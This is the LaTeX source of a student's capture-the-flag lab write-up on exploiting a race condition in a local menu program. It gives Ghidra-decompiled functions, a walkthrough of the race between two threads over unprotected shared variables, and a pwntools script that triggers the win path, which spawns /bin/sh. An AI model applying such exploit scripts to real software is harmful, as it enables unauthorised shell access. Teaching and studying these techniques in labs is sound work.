@@ -1,0 +1,236 @@
+\documentclass{article}
+
+% Language setting
+% Replace `english' with e.g. `spanish' to change the document language
+\usepackage[english]{babel}
+
+% Set page size and margins
+% Replace `letterpaper' with`a4paper' for UK/EU standard size
+\usepackage[a4paper,top=2cm,bottom=2cm,left=3cm,right=3cm,marginparwidth=1.75cm]{geometry}
+
+% Useful packages
+\usepackage{amsmath}
+\usepackage{graphicx}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage[colorlinks=true, allcolors=blue]{hyperref}
+
+\usepackage{algorithm, algpseudocode}
+\usepackage{csquotes}
+\usepackage{subfig}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2
+}
+
+\lstset{style=mystyle}
+\newcommand{\code}[1]{\lstinline|#1|}
+\setlength\parindent{0pt}
+
+\begin{document}
+\begin{titlepage}
+  \begin{center}
+    \vfill
+
+    \includegraphics[width=4cm]{sjtu.png}
+
+    \vspace{1cm}
+
+    \textbf{\huge Shanghai Jiao Tong University}
+
+    \vspace{0.5cm}
+
+    {\large race 1}
+
+    \vspace{1.5cm}
+
+    Ng Tze Kean\\Student number: 721370290002
+
+  \end{center}
+\end{titlepage}
+
+\subsection*{Problem}
+
+The problem that we are tackling this time is a race condition in the given
+program. What we first try to do is to examine the behavior of the program. We
+test the different menu options of the program and we can guess that there is a
+type of sequence that we have to input fast enough to cause a race condition.
+
+\begin{lstlisting}[language=bash]
+
+\end{lstlisting}
+
+It is likely that the race condition is the case statement for switching
+between the different menu options or that there is some variable that is
+checked against that is not well protected against modification.
+
+\begin{lstlisting}[language=bash]
+  if (choice == 4) {
+    menu_exit();
+  }
+  else if (choice < 5) {
+    if (choice == 3) {
+      menu_test();
+    }
+    else if (choice < 4) {
+      if (choice == 1) {
+        menu_go();
+      }
+      else if (choice == 2) {
+                    /* creates a new thread to run menu_chance */
+        ret1 = pthread_create(&th1,(pthread_attr_t *)0x0,menu_chance,&pstr1);
+      }
+    }
+  }
+\end{lstlisting}
+
+To investigate further we use ghidra to examine the nature of the program by
+decompiling the program. Through examination, we can see that
+\code{menu_chance} is being created in another thread. It is very likely that
+the exploit will make use of the race condition between \code{menu_go} and
+\code{menu_chance}. There is also a function \code{menu_test} that performs a
+check, and if the check is successful, it will return that we "win" instead of
+"lose".
+
+\subsection*{Idea and Attack process}
+
+Now that we narrow down the problem, we want to strategic our approach. We take
+a look at the \code{menu_go} and \code{menu_chance} in ghidra and we notice
+that there are a few checks before variable \code{a} and \code{b} is modified.
+
+\begin{lstlisting}[language=bash]
+void menu_go(void)
+{
+  int in_GS_OFFSET;
+  if (a_sleep == 0) {
+    a = a + 5;
+  }
+  else {
+    a_sleep = 0;
+  }
+  b = b + 2;
+  if (*(int *)(in_GS_OFFSET + 0x14) != *(int *)(in_GS_OFFSET + 0x14)) {
+    __stack_chk_fail_local();
+  }
+  return;
+}
+
+undefined4 menu_chance(void)
+{
+  int iVar1;
+  undefined4 uVar2;
+  int in_GS_OFFSET;
+  
+  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
+  if (b < a) {
+    if (flag == 1) {
+      a_sleep = 1;
+      FUN_00011110(1);
+      flag = 0;
+    }
+    else {
+                    /* enters here if Chance is selected more than once */
+      FUN_00011130("Only have one chance");
+    }
+  }
+  else {
+                    /* prints "No" if Go has never been selected */
+    FUN_00011130(&DAT_00012008);
+  }
+  uVar2 = 0;
+  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
+    uVar2 = __stack_chk_fail_local();
+  }
+  return uVar2;
+}
+\end{lstlisting}
+
+We can guess that \code{menu_chance} is manipulating some value that is checked
+in \code{menu_test}. Through examination of \code{menu_test} we can see that
+there a check on \code{a<b} before we can win. In \code{menu_go}, it is likely
+that \code{a_sleep} is initialized to 0. Thus, causing \code{a<b} to be false as the if
+loop would be executed. We are also not able to call \code{menu_chance} first
+as there is a check that \code{menu_go} is first called. We now assume that
+\code{a} is minimally 5, then b must be at least 6 for us to win. Then, we must
+call \code{menu_go} at least 2 more times without running the \code{if} segment
+of the code such that only b is incremented. By doing so, we are able to
+increment \code{b} to 6 on the 3rd call.
+
+\begin{lstlisting}[language=bash]
+  if (a < b) {
+    apcStack_2c[0] = "Win!";
+    ppcVar3 = apcStack_2c;
+    FUN_00011130();
+    apcStack_2c[0] = "/bin/sh";
+    FUN_00011140();
+    apcStack_2c[0] = (char *)0x0;
+    FUN_00011150();
+  }
+  \end{lstlisting}
+
+We note that \code{menu_chance} is called through spawning another thread and
+this is likely where the race condition can be exploited. We can see that there
+is a check for \code{flag==1} and since this is not a protected variable,
+assuming that \code{b<a} then we can call \code{menu_chance} again and still
+get to set \code{a_sleep=1}.
+
+Now we can formulate our attack. We first call \code{menu_go} and we will
+having \code{a=5} and \code{b=2} we will call \code{menu_chance}, allowing us
+to update \code{a_sleep=1}, we quickly call \code{menu_go} to update \code{b=4}
+and before the first thread for \code{menu_chance} updates \code{flag}, we call
+\code{menu_chance} again, allowing us to set \code{a_sleep=1} once again. Now,
+we can call \code{menu_go} one more time, setting \code{b=6}. With that, we can
+now call \code{menu_test} allowing us to fulfill the check condition.
+
+\begin{lstlisting}[language=python]
+  from pwn import *
+
+  race = process('./race')
+  # wait for prompt for choice 1
+  race.recvregex(b'>')
+  # send choice 1 go
+  race.sendline(b'1')
+  # wait for prompt for choice 2
+  race.recvregex(b'>')
+  # send choice 2 chance
+  race.sendline(b'2')
+  # wait for prompt for choice 3
+  race.recvregex(b'>')
+  race.sendline(b'1')
+  race.recvregex(b'>')
+  race.sendline(b'2')
+  race.recvregex(b'>')
+  race.sendline(b'1')
+  race.recvregex(b'>')
+  # send choice 3 test
+  race.sendline(b'3')
+  # wait for response
+  print(race.recvline())
+\end{lstlisting}
+
+we create a python program that aids us in calling the required choices fast
+enough such that the race condition happens. Running the above python code
+allows us to `win' the CTF. Running the above in python3 with pwntools package
+installed will allow us to run the exploit successfully.
+
+\end{document}
